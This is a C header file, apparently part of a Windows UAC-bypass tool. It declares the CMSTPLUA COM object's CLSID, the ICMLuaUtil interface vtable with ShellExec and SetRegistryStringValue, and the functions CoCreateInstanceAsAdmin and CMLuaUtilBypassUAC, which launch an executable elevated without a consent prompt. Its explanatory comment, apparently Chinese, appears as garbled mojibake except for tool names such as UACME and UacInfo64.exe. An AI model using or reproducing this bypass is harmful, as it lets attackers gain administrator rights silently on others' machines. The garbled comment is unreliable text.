#ifndef _BYPASS_UAC_H_
#define _BYPASS_UAC_H_


#include <Windows.h>
#include <objbase.h>
#include <strsafe.h>

/**
 * 
Ҫʵ��BypassUACִ�������COM��������ǿ����ܽ�Ϊ���㡣
Elevation�����е�Enabled��Auto ApprovalΪTrue��
COM����еĽӿڴ��ڿ���ִ�������ICMLuaUtil��ShellExec��

���У����Ѱ�ҿ����õ�COM�����
������������Ҫ���ٵ�Ѱ�ҵ��߱��������COM�����һ�ַ�����ʹ��oleviewdotnet��һ��һ����ȥ��
��õķ�ʽ��ʵ��ͨ�����ʵ�ֶ��㵱ǰ�������е�COM�������������Ȼ��ȥ�������Ӧ���ԣ�Ŀǰ�Ѿ������������ӿ���ֱ���á�
ʹ��UACME��Ŀ�е�Yuubari
����ö������ļ�UacInfo64.exe�����л���ͬĿ¼������һ��uac18363.log�ļ�����¼������Ľ����
ʹ��UacInfo64.exe�õ��Ĳ�����������Ҫ��COM����������һЩ��������Ϣһ��Ѱ�Ҳ������ֻ��ҪUacInfo64.exe�Ϳ��԰�ϵͳ������֧��auto-elevate�Ķ��ҳ�����
����ʹ��֮ǰ�ᵽ��cmstplua����������3e5fc7f9-9a51-4367-9063-a120244fbec7�����Կ���Autoelevated COM objects���
 */
#define CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}" /*�Զ����� CMSTPLUA COM �ӿ�*/
#define IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}" /*cmlua shellexec����*/


typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {

	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE *QueryInterface)(
		__RPC__in ICMLuaUtil * This,
		__RPC__in REFIID riid,
		_COM_Outptr_  void **ppvObject);

		ULONG(STDMETHODCALLTYPE *AddRef)(
			__RPC__in ICMLuaUtil * This);

		ULONG(STDMETHODCALLTYPE *Release)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method1)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method2)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method3)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method4)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method5)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method6)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *ShellExec)(
			__RPC__in ICMLuaUtil * This,
			_In_     LPCWSTR lpFile,
			_In_opt_  LPCTSTR lpParameters,
			_In_opt_  LPCTSTR lpDirectory,
			_In_      ULONG fMask,
			_In_      ULONG nShow
			);

		HRESULT(STDMETHODCALLTYPE *SetRegistryStringValue)(
			__RPC__in ICMLuaUtil * This,
			_In_      HKEY hKey,
			_In_opt_  LPCTSTR lpSubKey,
			_In_opt_  LPCTSTR lpValueName,
			_In_      LPCTSTR lpValueString
			);

		HRESULT(STDMETHODCALLTYPE *Method9)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method10)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method11)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method12)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method13)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method14)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method15)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method16)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method17)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method18)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method19)(
			__RPC__in ICMLuaUtil * This);

		HRESULT(STDMETHODCALLTYPE *Method20)(
			__RPC__in ICMLuaUtil * This);

	END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil
{
	CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
};


HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid);

BOOL CMLuaUtilBypassUAC(LPCWSTR lpwszExecutable);


#endif